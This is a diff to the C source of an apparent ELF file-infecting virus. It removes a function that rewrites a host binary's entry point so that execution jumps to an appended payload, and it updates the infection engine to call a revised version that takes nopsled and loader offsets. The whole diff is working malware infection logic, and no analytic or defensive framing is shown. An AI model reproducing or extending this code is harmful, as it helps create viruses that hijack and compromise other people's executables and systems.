@@ -23,26 +23,6 @@ static bool	not_infected(const struct entry *file_entry, struct safe_ptr file_re
 	return true;
 }
 
-static bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry)
-{
-	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));
-
-	if (!hdr)  return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
-
-	const Elf64_Xword	sh_offset         = file_entry->safe_shdr->sh_offset;
-	const size_t		offset_in_section = file_entry->offset_in_section;
-	const size_t		entry_off         = sh_offset + offset_in_section;
-	const size_t		payload_offset    = file_entry->end_of_last_section;
-	const Elf64_Xword	payload_distance  = payload_offset - entry_off;
-
-	Elf64_Addr		e_entry = hdr->e_entry;
-
-	e_entry += payload_distance;
-	hdr->e_entry = e_entry;
-
-	return true;
-}
-
 static bool	adjust_sizes(struct entry *clone_entry, \
 			size_t shift_amount, size_t full_virus_size)
 {
@@ -102,7 +82,7 @@ bool		infection_engine(struct virus_header *vhdr, \
 	|| !find_entry(&clone_entry, clone_ref)
 	|| !adjust_sizes(&clone_entry, *shift_amount, *full_virus_size)
 	|| !setup_virus_header(clone_ref, *loader_off, *vhdr)
-	|| !change_entry(clone_ref, &file_entry))
+	|| !change_entry(clone_ref, &file_entry, vhdr->dist_nopsled_loader, vhdr->dist_client_loader))
 		return errors(ERR_THROW, _ERR_T_INFECTION_ENGINE);
 
 	return true;
